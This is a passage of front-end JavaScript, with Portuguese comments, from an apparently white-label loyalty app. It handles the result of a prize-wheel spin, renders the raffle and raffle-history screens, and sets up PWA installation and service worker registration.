                // Servidor manda a lista atual + o índice — sincroniza antes de
                // animar pra não cair em sector errado se o admin tiver mexido
                // nos prêmios durante a sessão.
                if (Array.isArray(resp.premios) && resp.premios.length) {
                    const mudou = resp.premios.length !== premios.length
                        || resp.premios.some((p, i) => p.id !== (premios[i] && premios[i].id));
                    if (mudou) {
                        premios.length = 0;
                        premios.push(...resp.premios);
                        roletaDesenhar(canvas, premios, 0);
                    }
                }

                // Fallback se servidor não soube qual fatia animar (roleta
                // sem fatia 'nada' configurada e caiu em consolação). Tenta
                // achar uma fatia 'nada' aqui mesmo; senão usa o índice 0.
                let idxAnimar;
                if (resp.premio_index !== null && resp.premio_index !== undefined) {
                    idxAnimar = resp.premio_index;
                } else {
                    const i = premios.findIndex(p => p && p.tipo === 'nada');
                    idxAnimar = i >= 0 ? i : 0;
                }
                const dur = status.tempo_min_ms + Math.random() * (status.tempo_max_ms - status.tempo_min_ms);
                await roletaAnimar(canvas, premios, idxAnimar, dur);

                if (resp.resultado.tipo_resultado === 'recompensa' || resp.resultado.tipo_resultado === 'pontos') {
                    roletaWin(); roletaVibrar([60, 40, 60, 40, 120]); roletaConfete();
                } else if (resp.resultado.tipo_resultado === 'sorteio_bilhete') {
                    roletaWin(); roletaVibrar([50, 30, 80]); roletaConfete();
                } else if (resp.resultado.tipo_resultado === 'nova_chance') {
                    roletaWin(); roletaVibrar([40, 30, 40]);
                } else {
                    roletaConsolacao(); roletaVibrar(40);
                }

                const acao = await roletaModalResultado(resp.resultado, resp.premio);
                if (acao === 'resgates') return showScreen('resgates');
                if (acao === 'sorteios') return showScreen('sorteios');
                showScreen('roleta');
            } catch (e) {
                toast(e.message || 'Erro ao girar', 'error');
                ROLETA.girando = false;
                btn.disabled = false;
                btn.classList.remove('opacity-50');
            } finally {
                ROLETA.girando = false;
            }
        };
    }
}

// ============ SORTEIOS ============

async function telaSorteios() {
    const data = await api('/cliente/sorteios');
    const e = STATE.empresa;
    const cor = e.cor_primaria, corSec = e.cor_secundaria;

    const statusInfo = (s) => ({
        ativo:     { label: 'Aceitando bilhetes', cls: 'bg-emerald-100 text-emerald-700', icon: 'ri-play-circle-line' },
        planejado: { label: 'Em breve',           cls: 'bg-amber-100 text-amber-700',     icon: 'ri-time-line' },
        sorteado:  { label: 'Sorteado',           cls: 'bg-indigo-100 text-indigo-700',   icon: 'ri-checkbox-circle-line' },
        cancelado: { label: 'Cancelado',          cls: 'bg-slate-200 text-slate-500',     icon: 'ri-close-circle-line' },
    }[s] || { label: s, cls: 'bg-slate-200 text-slate-600', icon: 'ri-question-line' });

    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col overflow-y-auto bg-slate-50">
        <div class="px-5 pt-6 pb-10 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            <button onclick="showScreen('home')" class="text-white/80 mb-3 flex items-center gap-1 text-sm hover:text-white transition">
                <i class="ri-arrow-left-line"></i> Voltar
            </button>
            <h1 class="text-2xl font-bold">Sorteios</h1>
            <p class="text-white/80 text-sm mt-1">${data.total_bilhetes_ativos} ${data.total_bilhetes_ativos === 1 ? 'bilhete ativo' : 'bilhetes ativos'}</p>
        </div>

        <div class="px-4 -mt-6 pb-6 space-y-3">
            ${data.sorteios.length === 0 ? `
                <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-8 text-center">
                    <div class="w-14 h-14 mx-auto rounded-full bg-slate-100 flex items-center justify-center mb-3">
                        <i class="ri-ticket-2-line text-3xl text-slate-400"></i>
                    </div>
                    <p class="text-sm text-slate-500 font-medium">Nenhum sorteio ativo</p>
                    <p class="text-xs text-slate-400 mt-1">Gire a roleta pra ganhar bilhetes!</p>
                </div>
            ` : ''}
            ${data.sorteios.map(s => {
                const info = statusInfo(s.status);
                const eVencedor = s.eu_venci;
                const corCard = eVencedor ? 'border-amber-300 bg-amber-50' : 'border-slate-200 bg-white';
                return `
                <div class="rounded-2xl border-2 ${corCard} overflow-hidden shadow-sm">
                    ${s.imagem ? `<img src="${escAttr(s.imagem)}" class="w-full h-32 object-cover">` : ''}
                    <div class="p-4">
                        <div class="flex items-start justify-between gap-3">
                            <div class="flex-1 min-w-0">
                                <p class="font-bold text-slate-800">${esc(s.nome)}</p>
                                ${s.descricao ? `<p class="text-xs text-slate-500 mt-0.5 line-clamp-2">${esc(s.descricao)}</p>` : ''}
                            </div>
                            <span class="text-[10px] font-semibold px-2 py-0.5 rounded-full flex items-center gap-1 ${info.cls} shrink-0">
                                <i class="${info.icon}"></i> ${info.label}
                            </span>
                        </div>

                        <div class="grid grid-cols-2 gap-2 mt-3 text-xs">
                            <div class="bg-slate-50 rounded-lg p-2">
                                <p class="text-slate-400 text-[10px] uppercase tracking-wider">Sorteio</p>
                                <p class="font-semibold text-slate-700">${s.data_sorteio}</p>
                            </div>
                            <div class="bg-slate-50 rounded-lg p-2">
                                <p class="text-slate-400 text-[10px] uppercase tracking-wider">Prêmio</p>
                                <p class="font-semibold text-slate-700 truncate">
                                    ${s.recompensa || (s.valor_estimado ? 'R$ ' + Number(s.valor_estimado).toFixed(2).replace('.', ',') : '—')}
                                </p>
                            </div>
                        </div>

                        ${s.meus_bilhetes > 0 ? `
                            <div class="mt-3 p-3 ${eVencedor ? 'bg-amber-100 border-amber-300' : 'bg-emerald-50 border-emerald-200'} border-2 border-dashed rounded-xl">
                                <p class="text-[11px] ${eVencedor ? 'text-amber-700' : 'text-emerald-700'} uppercase tracking-wider font-semibold">
                                    <i class="ri-ticket-2-fill"></i>
                                    ${eVencedor ? 'BILHETE VENCEDOR!' : `Seus ${s.meus_bilhetes} ${s.meus_bilhetes === 1 ? 'bilhete' : 'bilhetes'}`}
                                </p>
                                <div class="flex flex-wrap gap-1.5 mt-2">
                                    ${s.meus_numeros.map(n => {
                                        const venceu = s.vencedor_bilhete === n;
                                        return `<span class="inline-flex items-center gap-1 px-2.5 py-1 rounded-lg font-mono font-bold text-sm ${venceu ? 'bg-amber-500 text-white shadow' : 'bg-white text-slate-700 border border-slate-200'}">
                                            ${venceu ? '🏆 ' : ''}${n}
                                        </span>`;
                                    }).join('')}
                                </div>
                                ${s.limite ? `<p class="text-[10px] text-slate-500 mt-2">Limite: ${s.meus_bilhetes}/${s.limite} bilhetes por pessoa</p>` : ''}
                            </div>
                        ` : ''}

                        ${s.status === 'sorteado' && s.vencedor && !eVencedor ? `
                            <p class="text-xs text-slate-500 mt-3"><i class="ri-trophy-line"></i> Vencedor: <strong>${esc(s.vencedor)}</strong></p>
                        ` : ''}
                    </div>
                </div>
            `}).join('')}
            <div class="pt-2">
                <button onclick="showScreen('historicoSorteios')" class="w-full py-3 rounded-xl bg-white border border-slate-200 text-sm text-slate-600 font-medium hover:bg-slate-50">
                    <i class="ri-archive-line"></i> Ver histórico de sorteios passados
                </button>
            </div>
        </div>
    </div>`;
}

async function telaHistoricoSorteios() {
    const data = await api('/cliente/sorteios/historico');
    const e = STATE.empresa;
    const cor = e.cor_primaria, corSec = e.cor_secundaria;

    screenContainer.innerHTML = `
    <div class="fade-in flex-1 flex flex-col overflow-y-auto bg-slate-50">
        <div class="px-5 pt-6 pb-10 text-white" style="background:linear-gradient(135deg,${cor},${corSec})">
            <button onclick="showScreen('sorteios')" class="text-white/80 mb-3 flex items-center gap-1 text-sm hover:text-white transition">
                <i class="ri-arrow-left-line"></i> Voltar
            </button>
            <h1 class="text-2xl font-bold">Histórico de sorteios</h1>
            <p class="text-white/80 text-sm mt-1">Sorteios que você participou</p>
        </div>

        <div class="px-4 -mt-6 pb-6 space-y-3">
            ${data.sorteios.length === 0 ? `
                <div class="bg-white rounded-2xl shadow-md border border-slate-100 p-8 text-center">
                    <div class="w-14 h-14 mx-auto rounded-full bg-slate-100 flex items-center justify-center mb-3">
                        <i class="ri-archive-line text-3xl text-slate-400"></i>
                    </div>
                    <p class="text-sm text-slate-500 font-medium">Nenhum sorteio no histórico</p>
                    <p class="text-xs text-slate-400 mt-1">Sorteios finalizados aparecerão aqui</p>
                </div>
            ` : ''}
            ${data.sorteios.map(s => {
                const eVencedor = s.eu_venci;
                const ehCancelado = s.status === 'cancelado';
                return `
                <div class="rounded-2xl border-2 ${eVencedor ? 'border-amber-300 bg-amber-50' : 'border-slate-200 bg-white'} overflow-hidden shadow-sm">
                    <div class="p-4">
                        <div class="flex items-start justify-between gap-3">
                            <div class="flex-1 min-w-0">
                                <p class="font-bold text-slate-800">${esc(s.nome)}</p>
                                <p class="text-[11px] text-slate-400 mt-0.5">${esc(s.data_sorteio)}</p>
                            </div>
                            <span class="text-[10px] font-semibold px-2 py-0.5 rounded-full ${ehCancelado ? 'bg-rose-100 text-rose-700' : 'bg-slate-200 text-slate-600'}">
                                ${ehCancelado ? 'Cancelado' : 'Encerrado'}
                            </span>
                        </div>

                        <div class="mt-2 flex flex-wrap gap-1.5">
                            ${s.meus_numeros.map(n => {
                                const venceu = s.vencedor_bilhete === n;
                                return `<span class="inline-flex items-center gap-1 px-2 py-0.5 rounded font-mono text-xs ${venceu ? 'bg-amber-500 text-white' : 'bg-slate-100 text-slate-600'}">
                                    ${venceu ? '🏆 ' : ''}${n}
                                </span>`;
                            }).join('')}
                        </div>

                        ${!ehCancelado && s.vencedor ? `
                            <p class="text-xs text-slate-500 mt-3">
                                ${eVencedor
                                    ? `<i class="ri-trophy-fill text-amber-500"></i> <strong>Você venceu!</strong>`
                                    : `<i class="ri-trophy-line"></i> Vencedor: <strong>${esc(s.vencedor)}</strong>`}
                            </p>
                        ` : ''}
                    </div>
                </div>
            `}).join('')}
        </div>
    </div>`;
}

// ============ PWA INSTALL ============
let deferredPrompt;
window.addEventListener('beforeinstallprompt', (e) => {
    e.preventDefault();
    deferredPrompt = e;
    $('#install-btn').classList.remove('hidden');
});

$('#install-btn').addEventListener('click', async () => {
    if (!deferredPrompt) return;
    deferredPrompt.prompt();
    await deferredPrompt.userChoice;
    deferredPrompt = null;
    $('#install-btn').classList.add('hidden');
});

// ============ SERVICE WORKER ============
if ('serviceWorker' in navigator) {
    // Em white label, usa SW dinâmico (gerado pelo Laravel) com escopo da empresa
    if (window.WHITELABEL_SW) {
        navigator.serviceWorker.register(window.WHITELABEL_SW, { scope: './' }).catch(() => {});
    } else {
        navigator.serviceWorker.register('sw.js', { scope: './' }).catch(() => {});
    }
}

// ============ BOOT ============
aplicarTemaEmpresa();
const telaInicial = STATE.token
    ? (STATE.cliente?.senha_temporaria ? 'trocarSenha' : 'home')
    : 'escolherEmpresa';
showScreen(telaInicial);
